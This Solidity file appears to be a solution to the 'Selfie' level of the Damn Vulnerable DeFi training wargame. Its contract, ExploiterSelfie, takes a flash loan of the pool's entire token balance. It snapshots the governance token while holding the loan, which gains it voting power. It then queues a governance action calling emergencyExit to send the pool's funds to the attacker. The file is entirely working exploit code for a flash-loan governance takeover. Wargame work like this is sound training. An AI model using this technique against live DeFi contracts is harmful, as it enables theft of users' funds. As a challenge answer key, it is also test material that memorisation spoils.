// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ISimpleGovernance.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "../DamnValuableTokenSnapshot.sol";

interface ISelfiePool {
    function flashLoan(
        IERC3156FlashBorrower _receiver,
        address _token,
        uint256 _amount,
        bytes calldata _data
    ) external;

    function emergencyExit(address receiver) external;
}

contract ExploiterSelfie {
    ISimpleGovernance public immutable governance;
    DamnValuableTokenSnapshot public immutable token;
    ISelfiePool public immutable pool;

    constructor(ISimpleGovernance _governance, DamnValuableTokenSnapshot _token, ISelfiePool _pool) {
        governance = _governance;
        token = _token;
        pool = _pool;
    }

    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256,
        bytes calldata
    ) external returns (bytes32) {
        token.snapshot();
        token.approve(address(pool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function attack() external returns (uint) {
        pool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(token),
            token.balanceOf(address(pool)),
            ""
        );

        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", msg.sender);
        uint actionId = governance.queueAction(address(pool), 0, data);
        return actionId;
    }
}
